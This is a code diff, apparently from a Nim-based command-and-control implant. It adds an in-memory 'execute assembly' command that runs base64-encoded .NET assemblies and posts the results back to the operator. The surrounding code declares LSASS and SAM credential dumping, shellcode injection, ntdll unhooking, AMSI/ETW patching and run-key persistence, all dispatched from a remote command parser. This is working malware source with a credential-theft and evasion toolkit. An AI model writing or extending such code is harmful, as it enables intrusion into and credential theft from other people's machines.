@@ -28,6 +28,7 @@ proc wrap_get_screenshot(): bool
 proc dump_lsass(dump_method: string): bool
 proc dump_sam(): bool
 proc wrap_inject_shellc(shellc_base64: string, pid: int): bool
+proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool
 proc wrap_unhook_ntdll(): bool
 proc wrap_patch_func(command_name: string): bool
 proc set_run_key(key_name: string, cmd: string): bool
@@ -355,6 +356,23 @@ proc wrap_inject_shellc(shellc_base64: string, pid: int): bool =
     is_success = post_data("shellc" , $data)
 
 
+proc wrap_execute_assembly(assembly_base64: string, assembly_args: string): bool =
+    var assembly_bytes = to_bytes(decode_64(assembly_base64, is_bin=true))
+    var is_success: bool
+    var output: string
+    
+    (is_success, output) = execute_assembly(assembly_bytes, assembly_args.split(" "))
+    
+    var data = {
+        "is_success": $is_success,
+        "output": output
+    }.toOrderedTable()
+    
+    is_success = post_data("assembly", $data)
+
+    return is_success
+
+
 proc wrap_unhook_ntdll(): bool =
     
     var is_success = unhook_ntdll()
@@ -600,6 +618,8 @@ proc parse_command(command: JsonNode): bool =
             is_success = dump_sam()
         of "shellc":
             is_success = wrap_inject_shellc(command["shellc_base64"].getStr(), command["pid"].getInt())
+        of "assembly":
+            is_success = wrap_execute_assembly(command["assembly_base64"].getStr(), command["assembly_args"].getStr())
         of "unhook":
             is_success = wrap_unhook_ntdll()
         of "amsi", "etw":
